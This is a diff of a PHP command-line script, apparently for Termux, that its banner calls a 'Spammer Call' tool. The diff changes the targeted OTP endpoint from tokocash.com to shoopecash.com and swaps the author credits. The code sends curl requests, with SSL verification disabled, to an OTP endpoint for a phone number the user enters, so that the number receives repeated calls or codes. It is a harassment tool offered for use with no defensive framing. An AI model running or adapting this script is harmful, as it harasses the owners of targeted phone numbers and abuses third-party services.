@@ -2,7 +2,7 @@
 // Limit 3x Telpon Setiap Satu Nomor
 function send($phone){
         $ch = curl_init();
-        curl_setopt($ch, CURLOPT_URL, "https://www.tokocash.com/oauth/otp");                      curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+        curl_setopt($ch, CURLOPT_URL, "https://www.shoopecash.com/oauth/otp");                      curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
         curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
         curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
         curl_setopt($ch, CURLOPT_HEADER, true);
@@ -13,12 +13,11 @@ function send($phone){
 }
 echo "
 ############################################################
-    Spammer Call From TOKOPEDIA
-        Author By   : AyipBontos
-        Support     : Kunjungi Website Kami
-        Website     : https://termux.id
-        Youtube     : Omalip TV
-     Penggunaannya  : Bisa Menggunakan [08/62]
+    Spammer Call From NASA CALL
+        dibuat oleh   : SMK MEDIAINFORMATIKA X RPL
+        follow    : @IRVIANOFFICIAL DAN @LESOTOLE
+        Website     : http://ilhamirvian.dx.am
+     pesan  : jangan mudah menyerah teruslah semangat dan jangan menyerah.:)
 ###########################################################\n";
 echo "Nomor\nInput : ";
 $nomor = trim(fgets(STDIN));
